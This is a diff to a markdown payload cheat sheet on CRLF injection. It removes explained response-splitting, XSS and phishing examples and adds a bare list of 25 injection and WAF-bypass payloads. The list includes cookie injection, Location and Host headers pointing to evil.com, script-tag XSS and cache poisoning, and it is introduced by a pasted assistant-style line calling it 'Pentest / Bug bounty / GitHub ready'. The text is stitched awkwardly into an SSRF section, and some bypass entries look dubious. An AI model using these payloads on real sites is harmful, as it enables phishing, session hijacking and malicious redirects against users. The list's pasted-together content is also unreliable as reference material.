@@ -3276,91 +3276,6 @@ Set-Cookie: sessionid=value
 Set-Cookie: admin=true
 ```
 
-Now the attacker has set their own cookie.
-
-### Cross Site Scripting
-
-Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).
-
-**Requested page**:
-
-```http
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
-```
-```
-http://www.example.net/index.php?lang=en
-Content-Length: 0
- 
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
-Content-Length: 34
- 
-<html>You have been Phished</html>
-```
-
-**HTTP response**:
-
-```http
-Set-Cookie:en
-Content-Length: 0
-
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
-Content-Length: 34
-
-<html>You have been Phished</html>
-```
-
-In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .
-
-**Requested page**:
-
-```powershell
-http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
-```
-```
-http://example.com/
-Content-Length:35
-X-XSS-Protection:0
-
-23
-<svg onload=alert(document.domain)>
-0
-//..
-```
-**HTTP Response**:
-
-```http
-HTTP/1.1 200 OK
-Date: Tue, 20 Dec 2016 14:34:03 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 22907
-Connection: close
-X-Frame-Options: SAMEORIGIN
-Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
-ETag: "842fe-597b-54415a5c97a80"
-Vary: Accept-Encoding
-X-UA-Compatible: IE=edge
-Server: NetDNA-cache/2.2
-Link: https://example.com/[INJECTION STARTS HERE]
-Content-Length:35
-X-XSS-Protection:0
-
-23
-<svg onload=alert(document.domain)>
-0
-```
-
-### Open Redirect
-
-Inject a `Location` header to force a redirect for the user.
-
-```ps1
-%0d%0aLocation:%20http://myweb.com
-```
-
 ## Filter Bypass
 
 [RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.
@@ -3383,27 +3298,162 @@ An example payload using UTF-8 characters would be:
 ```js
 嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
 ```
+Below is **same strict format** — **ONLY testcase names with payloads**, including **CRLF injection bypass payloads**.
+(No explanations. Pentest / Bug bounty / GitHub ready.)
 
-URL encoded version
+---
 
-```js
-%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
-```
+## CRLF Injection – Test Cases & Bypass Payloads
 
-### Exploitation Examples:
-#### Add a Cookie:
+### 1. Basic CRLF Injection
+
 ```
-http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
-```
-#### Bypass XSS Protection:
-```
-http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a<svg onload=alert(document.domain)>
-```
-#### Write HTML Response:
-```
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+%0d%0a
 ```
 
+### 2. HTTP Response Splitting
+
+```
+%0d%0aSet-Cookie:crlf=inject
+```
+
+### 3. Header Injection
+
+```
+%0d%0aX-Injected-Header: test
+```
+
+### 4. Cookie Injection
+
+```
+%0d%0aSet-Cookie:session=evil
+```
+
+### 5. Location Header Injection
+
+```
+%0d%0aLocation:https://evil.com
+```
+
+### 6. HTML Injection via CRLF
+
+```
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+```
+
+### 7. JavaScript Injection
+
+```
+%0d%0aContent-Type:application/javascript%0d%0a%0d%0aalert(1)
+```
+
+### 8. Cache Poisoning
+
+```
+%0d%0aCache-Control:public,max-age=999999
+```
+
+### 9. WAF Bypass using URL Encoding
+
+```
+%250d%250a
+```
+
+### 10. Mixed Encoding Bypass
+
+```
+%0d%250a
+```
+
+### 11. Unicode Encoding Bypass
+
+```
+%u000d%u000a
+```
+
+### 12. UTF-8 Overlong Encoding
+
+```
+%c0%8d%c0%8a
+```
+
+### 13. Newline Only Injection
+
+```
+%0a
+```
+
+### 14. Carriage Return Only Injection
+
+```
+%0d
+```
+
+### 15. Parameter Pollution CRLF
+
+```
+param=test%0d%0aInjected:1
+```
+
+### 16. Path-Based CRLF Injection
+
+```
+/test%0d%0aInjected:1
+```
+
+### 17. Host Header Injection via CRLF
+
+```
+%0d%0aHost:evil.com
+```
+
+### 18. XSS via CRLF + HTML
+
+```
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<img src=x onerror=alert(1)>
+```
+
+### 19. Open Redirect via CRLF
+
+```
+%0d%0aLocation://evil.com
+```
+
+### 20. Multiple Header Injection
+
+```
+%0d%0aX-Test:1%0d%0aX-Test2:2
+```
+
+### 21. Space Bypass
+
+```
+%0d%20%0a
+```
+
+### 22. Tab Bypass
+
+```
+%0d%09%0a
+```
+
+### 23. Semicolon Bypass
+
+```
+%0d;%0a
+```
+
+### 24. Double CRLF Injection
+
+```
+%0d%0a%0d%0a
+```
+
+### 25. CRLF via Referer
+
+```
+Referer: https://target.com/%0d%0aInjected:1
+```
 ## 3. Server-Side Request Forgery (SSRF)
 
 ### Exploitation Techniques:
